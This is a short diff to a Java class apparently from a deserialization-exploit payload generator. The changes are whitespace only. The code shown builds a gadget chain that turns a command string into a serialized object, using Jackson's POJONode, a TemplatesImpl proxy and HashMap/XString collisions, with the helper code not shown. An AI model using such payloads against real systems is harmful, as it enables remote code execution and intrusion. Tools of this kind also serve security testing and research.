@@ -22,7 +22,7 @@ public class Jackson4 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         try {
-            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
             CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
             ctClass.removeMethod(writeReplace);
             ctClass.toClass();
@@ -31,9 +31,9 @@ public class Jackson4 implements ObjectPayload<Object> {
         }
 
         POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
-        XObject                 xString = new XString("foo");
-        HashMap<Object, Object> map1    = new HashMap();
-        HashMap<Object, Object> map2    = new HashMap();
+        XObject xString = new XString("foo");
+        HashMap<Object, Object> map1 = new HashMap();
+        HashMap<Object, Object> map2 = new HashMap();
         map1.put("yy", node);
         map1.put("zZ", xString);
         map2.put("yy", xString);
